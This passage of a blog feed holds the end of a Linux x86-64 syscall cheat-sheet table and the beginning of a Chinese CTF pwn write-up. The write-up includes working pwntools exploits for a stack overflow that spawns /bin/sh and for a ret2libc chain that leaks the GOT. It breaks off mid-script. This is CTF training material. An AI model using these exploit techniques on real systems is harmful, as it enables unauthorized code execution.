href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0xe0</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>swapoff</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td><td align="center">0xe1</td><td>const char *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0xe2</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">227</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0xe3</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">228</td><td>mlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td><td align="center">0xe4</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">229</td><td>munlock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td><td align="center">0xe5</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>mlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td><td align="center">0xe6</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>munlockall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td><td align="center">0xe7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xe8</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xe9</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xea</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">235</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0xeb</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">236</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0xec</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">237</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0xed</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>migrate_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0xef</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">240</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0xf0</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">241</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0xf1</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">242</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0xf2</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0xf3</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">244</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf4</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">245</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf5</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">246</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf6</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">247</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf7</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">248</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf8</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">249</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xf9</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">250</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfa</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">251</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">252</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfc</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">253</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfd</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">254</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfe</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">255</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xff</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">256</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x100</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">257</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x101</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">258</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x102</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">259</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x103</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">260</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x104</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x105</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x106</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x107</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">264</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x108</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">265</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x109</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x10a</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x10b</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x10c</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x10d</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x10e</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">271</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x10f</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">272</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x110</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">273</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x111</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">274</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x112</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>sched_getattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td><td align="center">0x113</td><td>pid_t pid</td><td>struct sched_attr *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">276</td><td>renameat2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td><td align="center">0x114</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>unsigned int flags</td><td>-</td></tr><tr><td align="center">277</td><td>seccomp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td><td align="center">0x115</td><td>unsigned int op</td><td>unsigned int flags</td><td>void *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>getrandom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td><td align="center">0x116</td><td>char *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>memfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td><td align="center">0x117</td><td>const char *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">280</td><td>bpf</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td><td align="center">0x118</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">281</td><td>execveat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td><td align="center">0x119</td><td>int dfd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>int flags</td><td>-</td></tr><tr><td align="center">282</td><td>userfaultfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td><td align="center">0x11a</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>membarrier</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td><td align="center">0x11b</td><td>int cmd</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>mlock2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td><td align="center">0x11c</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>copy_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td><td align="center">0x11d</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">286</td><td>preadv2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td><td align="center">0x11e</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">287</td><td>pwritev2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td><td align="center">0x11f</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td></tr><tr><td align="center">288</td><td>pkey_mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_mprotect">cs/</a></td><td align="center">0x120</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>pkey_alloc</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_alloc.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_alloc">cs/</a></td><td align="center">0x121</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>pkey_free</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pkey_free.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pkey_free">cs/</a></td><td align="center">0x122</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>statx</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statx.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statx">cs/</a></td><td align="center">0x123</td><td>int dfd</td><td>const char *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx *buffer</td><td>-</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueWhaleOJ Pwn WriteUp Part 1</title>
      <link href="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/"/>
      <url>/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/</url>
      
        <content type="html"><![CDATA[<h1 id="bof-32"><a href="#bof-32" class="headerlink" title="bof(32)"></a>bof(32)</h1><p>最简单的栈溢出，通过 IDA 分析出 buf 的位置在 ebp-0x1c 处</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/1.png"></p><p>因此就可以填充 0x1c+4 个垃圾字节，最后的那 4 个字节为了覆盖 ebp，之后就可以修改 eip，覆盖 eip 为调用 system 函数的指令地址，即 0x08048568</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/2.png"></p><p>接下来就需要控制 system 的参数了，通过 ida 的 string 界面可以看到刚好有一个全局字符串变量”/bin/sh”，其地址位于 0x0804A02C</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/3.png"></p><p>system 函数的参数调用是通过栈传递的，因此就可以在栈上 eip 的后面添加该字符串的地址，当执行完 pop eip 以后栈顶就是该字符串的地址了。exp 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9990</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">    elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line">    command = <span class="number">0x0804A02C</span></span><br><span class="line">system_addr = <span class="number">0x08048568</span></span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>) + p32(system_addr) + p32(command))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>最后拿到 flag 为<code>ctf&#123;you_know_how_2_ove1flow&#125;</code></p><h1 id="ROP-50"><a href="#ROP-50" class="headerlink" title="ROP(50)"></a>ROP(50)</h1><p>题目中没有执行命令的函数，而且也设置了 NX，所以不能通过 shellcode 执行命令，所以需要调用 libc 中的 system 执行 shell。首先通过栈溢出可以调用 puts 函数输出 puts 在 got 表中的地址，拿到 puts 在 got 表中的地址后就可以获取 puts 在 libc 中的偏移，两者作差就可以算出 got 表的基址，拿到 got 表的基址以后再加上 system 函数在 libc 中的偏移就可以算出 system 函数在 got 表中的地址，这样就可以调用 system 函数，system 的参数可以在 libc 中查找字符串’/bin/sh’的地址。</p><p>获取 puts 在 got 表中地址的 payload 为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x80484EA</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;OP world\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(puts_plt) + p32(run_addr) + p32(puts_got))</span><br></pre></td></tr></table></figure><p>其中 <code>0x58+4</code> 个 a 是为了填充栈空间，puts_plt 就是 puts 的地址，将 puts 的地址覆盖为 eip 就可以调用 puts 函数，而 run_addr 就是调用完 puts 函数的返回地址，为了不使程序结束，这里设置的 0x80484EA 为 main 函数的地址，之后栈上的内容即为 puts 要打印的内容的地址即 puts_got，由于可能会输出很多字符，所以只需要去前四个字节即可。泄漏了 puts 的地址以后计算 system 地址的公式如下</p><p><code>system_addr = puts_addr - puts_offset + system_offset</code></p><p>其中 puts_addr 即为泄漏的 puts 地址，puts_offset 和 system_offset 即为 puts 函数和 system 函数在 libc 中的偏移。最终的 exp 如下，最后拿到 flag 为<code>ctf&#123;ROP_1s_Really_Usefu11y&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">9991</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">   conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   conn = process(elf.path)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">run_addr = <span class="number">0x80484EA</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;OP world\n&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(puts_plt) + p32(run_addr) + p32(puts_got))</span><br><span class="line"></span><br><span class="line">puts_addr = u32(conn.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;Get puts address: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = libc.search(<span 